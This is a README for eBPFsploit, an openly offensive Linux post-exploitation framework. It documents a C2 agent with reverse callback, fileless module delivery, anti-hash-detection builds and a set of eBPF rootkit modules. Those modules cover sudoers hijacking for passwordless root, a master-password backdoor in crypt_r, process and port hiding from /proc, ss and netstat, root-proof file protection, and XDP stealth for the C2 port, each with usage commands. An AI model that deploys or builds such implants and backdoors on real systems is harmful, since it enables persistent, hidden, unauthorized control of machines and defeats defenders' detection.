<p align="center">
  <h1 align="center">🐍 eBPFsploit</h1>
  <p align="center">
    <b>Kernel-level Post-Exploitation Framework powered by eBPF</b>
  </p>
  <p align="center">
    <b>English</b> | <a href="README_CN.md">中文</a>
  </p>
  <p align="center">
    <img src="https://img.shields.io/badge/language-C%20%7C%20Python-blue" alt="Language">
    <img src="https://img.shields.io/badge/platform-Linux%20(x86__64)-green" alt="Platform">
    <img src="https://img.shields.io/badge/kernel-5.8%2B-orange" alt="Kernel">
    <img src="https://img.shields.io/badge/license-CC--BY--NC--SA%204.0-lightgrey" alt="License">
    <img src="https://img.shields.io/badge/built%20with-Vibe%20Coding%20🎵-ff69b4" alt="Vibe Coding">
  </p>
</p>

---

eBPFsploit is a modular post-exploitation framework that leverages Linux eBPF to perform **kernel-level** offensive operations — privilege escalation, credential hijacking, process/port hiding, file protection, and C2 communication stealth — all without kernel modules or disk artifacts.

> [!IMPORTANT]

> **⚠️ Disclaimer:** This tool is intended for **authorized security research and penetration testing only**. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse.

> **🎵 Vibe Coding:** This project was built through Vibe Coding — an AI-assisted development approach where the developer guides the vision and architecture while collaborating with AI to bring it to life.

**Framework Highlights:**

* 🔌 **Fileless module delivery** — BPF bytecode transmitted over network, never touches disk
* 👻 **Shadow Daemon persistence** — modules survive agent restarts via FD inheritance
* 🔐 **Encrypted C2 channel** — PSK + XOR obfuscation, auto-generated per build
* 🎯 **Runtime reconfiguration** — update BPF Maps on-the-fly without reloading
* 🔍 **Auto recon** — environment capability scanning before module deployment
* 🛡️ **Anti-detection** — per-build unique binary hash via `builder.py`

## 🏗️ Architecture

```
┌──────────────────┐         TCP 144-byte          ┌─────────────────────────┐
│    Console       │      binary protocol          │    Target Machine       │
│   (Python CLI)   │ ◄──────────────────────────►  │                         │
│                  │                               │  ┌──────────┐           │
│  use / set / run │                               │  │  Agent   │  (C bin)  │
│  update / recon  │                               │  │         ─┼──► libbpf │
│  sessions / ...  │                               │  └────┬─────┘     │     │
└──────────────────┘                               │       │ fork()    ▼     │
                                                   │  ┌────▼─────┐  Kernel   │
                                                   │  │  Shadow  │  eBPF     │
                                                   │  │  Daemon  │ Programs  │
                                                   │  └──────────┘           │
                                                   └─────────────────────────┘
```

## 📋 Prerequisites

* **Linux kernel ≥ 5.8** with BTF support (`CONFIG_DEBUG_INFO_BTF=y`)
* **Root privileges** on the target machine
* Build tools: `gcc`, `clang`, `bpftool`, `make`
* Libraries: `libbpf-dev`, `libelf-dev`, `zlib1g-dev`
* Python 3.8+ with `pyelftools`, `colorama`

## 🔨 Build

```bash
# 1. Generate vmlinux.h from the running kernel's BTF info
make vmlinux

# 2. Build everything (Agent + all eBPF modules)
make all

# 3. Install Console dependencies
pip install -r console/requirements.txt
```

### Build Targets

| Target           | Description                                             |
| ---------------- | ------------------------------------------------------- |
| `make all`     | Build Agent binary + compile all BPF modules            |
| `make agent`   | Build only the Agent (`agent/agent`)                  |
| `make modules` | Compile only the eBPF modules →`console/modules/`    |
| `make vmlinux` | Generate `vmlinux.h` from `/sys/kernel/btf/vmlinux` |
| `make clean`   | Remove all build artifacts                              |

### Generate a Unique Agent (Anti-Hash Detection)

`make all` automatically calls `builder.py`, which generates a **unique PSK**, injects it into both Agent and Console, and produces a binary with a **unique hash** — random build ID injection, symbol stripping, and junk data appending. Each `make` run produces a fresh key pair and unique binary.

## 🚀 Usage

### 1. Start the Agent on Target

```bash
# Bind mode — Agent listens, Console connects
./agent -b 4444

# Reverse mode — Agent calls back to Console
./agent -r <console_ip> 4444

# With XDP stealth (hides C2 port at NIC driver level)
./agent -b 4444 -i eth0
```

### 2. Connect from Console

```bash
# Forward — connect to Agent
python3 console/console.py <target_ip> 4444

# Reverse — wait for Agent callback
python3 console/console.py 4444
```

### 3. Interactive Shell

```bash
ebpfsploit > list                          # List available modules
ebpfsploit > use godmode                   # Select module
ebpfsploit (godmode) > show options        # View configuration
ebpfsploit (godmode) > set target user     # Set target user for privilege escalation
ebpfsploit (godmode) > run                 # Deploy to target kernel

ebpfsploit > sessions                      # List active sessions
ebpfsploit > show session 1                # View session details
ebpfsploit > update 1 target newuser       # Change the target user dynamically
ebpfsploit > unload 1                      # Remove module from kernel (alias: kill)
ebpfsploit > kill 2                        # Close session 2
ebpfsploit > update 1 target 80 443 8080   # Multiple value update (overwrites map)
ebpfsploit > recon                         # Re-scan target environment
```

## 📁 Project Structure

```
ebpfsploit/
├── Makefile                          # Build system
├── README.md
├── agent/
│   ├── agent.c                       # C2 Agent implant
│   └── builder.py                    # Anti-hash-detection builder
└── console/
    ├── console.py                    # Interactive CLI console
    ├── requirements.txt              # Python dependencies
    ├── modules_src/                  # eBPF module source code
    │   ├── vmlinux.h                 # Kernel type definitions (generated)
    │   ├── template.bpf.c            # Module development template
    │   ├── godmode.bpf.c             # Sudoers hijacking
    │   ├── golden_key.bpf.c          # Master password injection
    │   ├── shadow_walker.bpf.c       # Process hiding
    │   ├── netghost.bpf.c            # Port hiding
    │   ├── guard.bpf.c               # File/process protection
    │   └── stealth_link.bpf.c        # XDP C2 stealth
    └── modules/                      # Compiled .bpf.o files (build output)
```

## 🔬 How It Works

### Fileless Module Loading

The Console reads `.bpf.o` files locally, transmits the raw ELF bytecode over TCP to the Agent. The Agent uses `bpf_object__open_mem()` to load directly from memory — **no file is ever written to the target's disk**.

### Shadow Daemon Persistence

After loading a module, the Agent forks a Shadow Daemon that inherits all BPF Map file descriptors via `SCM_RIGHTS` over an **abstract namespace Unix socket** (no filesystem footprint). If the Agent crashes or is restarted, it reconnects to Shadow Daemons and resumes all sessions seamlessly.

### XDP RST Spoofing (stealth_link)

Instead of silently dropping unauthorized packets (which nmap reports as `filtered`), the XDP program crafts a **TCP RST reply** in-place. Port scanners report the port as `closed` — indistinguishable from a genuinely unused port.

## ⚡ Module Details

<details>
<summary><b>godmode</b> — Sudoers Hijacking</summary>

Hooks `openat` and `read` syscalls via tracepoints. When the `sudo` or `visudo` process reads `/etc/sudoers`, the content returned to userspace is replaced with an injected rule granting passwordless sudo. A strict process name (`comm`) filter ensures the payload remains completely invisible to standard editors or tools like `cat`.

**Requires:** root, tracefs, `bpf_probe_write_user`

```bash
use godmode
set target user
run
```

</details>

<details>
<summary><b>golden_key</b> — Master Password</summary>

Attaches uprobe/uretprobe to `crypt_r()` in `libcrypt.so.1`. When the master password is detected, it captures the real shadow hash and overwrites `crypt_r()`'s output buffer to match — PAM thinks authentication succeeded.

**Requires:** root, uprobe, `bpf_probe_write_user`

```bash
use golden_key
set target "mysecretpass"
run
# Now log in with "mysecretpass" as any user's password
```

</details>

<details>
<summary><b>shadow_walker</b> — Process Hiding</summary>

Hooks `getdents64` to manipulate directory entries returned from `/proc`. Target PIDs are removed by adjusting `d_reclen` to skip their entries.

**Requires:** root, tracefs, `bpf_probe_write_user`

```bash
use shadow_walker
run
update <session_id> target <pid_to_hide> <another_pid>
```

</details>

<details>
<summary><b>netghost</b> — Port Hiding</summary>

Hooks Netlink socket receives (`recvmsg`/`recvfrom`) to intercept and neutralize network diagnostic messages, making hidden ports invisible to `ss`. Simultaneously hooks `execve` to silently hijack any execution of `netstat` into `ss`.

**Requires:** root, tracefs, `bpf_probe_write_user`

```bash
use netghost
run
update <session_id> target 4444 80 22
```

</details>

<details>
<summary><b>guard</b> — File & Process Protection</summary>

Uses powerful LSM BPF hooks (`inode_permission`, `file_open`, `path_truncate`, `path_rename`, `path_unlink`, `task_kill`) to completely block writing, truncation, deletion, renaming, and killing of protected targets — **even root cannot bypass it**.

**Requires:** root, LSM BPF support, CAP_MAC_ADMIN

```bash
use guard
run
update <session_id> target_inodes <inode1> <inode2>
update <session_id> target_pids <pid1>
```

</details>

<details>
<summary><b>stealth_link</b> — C2 Communication Stealth</summary>

XDP program that hides the Agent's listening port at the network driver level. Unauthorized SYN packets receive a forged RST, making the port appear closed to scanners.

**Requires:** root, XDP, CAP_NET_ADMIN

```bash
# Auto-loaded with -i flag:
./agent -b 4444 -i eth0

# Or manually via console:
# use stealth_link
# set target_port 4444
# set target_ip 1.2.3.4 5.6.7.8
# run
# update <session_id> target_ip 9.10.11.12

# In Bind mode: First console connection gets auto-whitelisted, then port locks down.
# In Reverse mode: The target IP is auto-whitelisted from the start.
```

</details>

## 📜 License

This project is licensed under [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/).

You are free to share and adapt this work for **non-commercial** purposes, with appropriate credit and under the same license.

**Use responsibly. Hack ethically. 🛡️**
